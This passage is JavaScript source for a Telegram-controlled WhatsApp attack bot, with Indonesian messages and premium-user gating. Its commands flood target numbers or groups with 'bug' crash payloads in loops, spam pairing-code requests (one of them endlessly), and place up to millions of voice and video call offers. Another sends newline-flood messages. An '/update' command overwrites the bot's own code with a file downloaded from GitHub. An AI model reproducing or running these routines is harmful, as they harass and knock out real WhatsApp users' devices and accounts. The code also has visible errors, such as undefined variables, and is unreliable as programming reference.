  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`js
LU SIAPA? NGENTOT\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/GabreilDitzforever",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: /blankgroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 700; i++) {
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await VNFMakloe(sock, target);
            await sleep (3000) 
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://cdn.phototourl.com/free/2026-04-19-3a970b10-c140-40ae-98b4-39b015faf30a.png", {
        caption: `
\`\`\`
#SUCCES BUG❗
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//=======END CASE BUG =========//

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://cdn.phototourl.com/free/2026-04-19-3a970b10-c140-40ae-98b4-39b015faf30a.png", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐒𝐀𝐍𝐙𝐎𝐏𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐀𝐍𝐙𝐎𝐏𝐄 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By VØⱤⱠɆӾ ₵Ɽ₳₴Ⱨ😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/rezzxaay-byte/index.js/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    const repliedMessage = msg.reply_to_message;

    
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${username ? `@${username}` : 'Tidak ada'}
×͜× ID: \`${senderId}\`
╰────────────────⬣
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; 
    }

    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
╭━━「 INFO PENGGUNA 」━━━⬣
×͜× Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
×͜× ID: \`${repliedUserId}\`
×͜× Nama: \`${repliedFullName}\`
╰────────────────⬣
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});
//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});


